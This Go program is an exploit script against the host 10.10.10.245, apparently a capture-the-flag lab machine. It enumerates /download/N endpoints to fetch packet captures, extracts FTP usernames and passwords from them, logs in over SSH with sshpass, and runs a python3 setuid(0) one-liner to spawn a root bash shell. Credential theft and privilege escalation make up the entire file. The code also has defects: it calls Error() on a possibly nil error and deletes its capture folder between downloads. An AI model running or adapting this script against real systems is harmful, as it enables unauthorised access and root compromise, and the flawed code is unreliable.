package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"errors"
	"strings"
	"io"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

// Global settings
var host string = "10.10.10.245"
var captures string = "./captures"
var username string
var password string

func main() {
	cleanup()
	setup()

	// download all files until 404 
	for i := 0; i < i + 1; i++ {
		err := download(i)
		if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "found") {
			break;
		} else if err != nil {
			panic(err)
		}
	}

	// Login found, get shell
	if username != "" && password != "" {
		user_and_host := fmt.Sprintf("%s@%s", username, host)
		priv_esc := "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
		cmd := exec.Command("sshpass", "-p", password, "ssh", user_and_host, priv_esc)
		fmt.Println("Enter command: ")
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		_ = cmd.Run()
	} else {
		fmt.Println("exploit did not work")
		cleanup()
	}
}

func cleanup() {
	if err := os.RemoveAll(captures); err != nil {
		panic(err)
	}
}

func setup() {
	if err := os.Mkdir(captures, 0755); err != nil {
		panic(err)
	}
}

func download(fileid int) error {
	url := fmt.Sprintf("http://%s/download/%d", host, fileid)

	resp, _ := http.Get(url)
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return errors.New("404")
	}

	filepath := fmt.Sprintf("%s/%d.pcap", captures, fileid)
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// write to file
	_, err = io.Copy(out, resp.Body)

	username, password = analyze(filepath)
	if username != "" && password != "" {
		cleanup()
		return errors.New("found")
	}
	cleanup()
	return err
}

func analyze(file string) (string, string) {
	var u string
	var p string

	handle, err := pcap.OpenOffline(file)
	if err != nil {
		panic(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		if app := packet.ApplicationLayer(); app != nil {
			payload := string(app.Payload())

			if strings.Contains(payload, "USER") {
				u = strings.Fields(payload)[1]
			} else if strings.Contains(payload, "PASS") {
				p = strings.Fields(payload)[1]
			}
		}
		if u != "" && p != "" {
			break
		}
	}

	return u, p
}
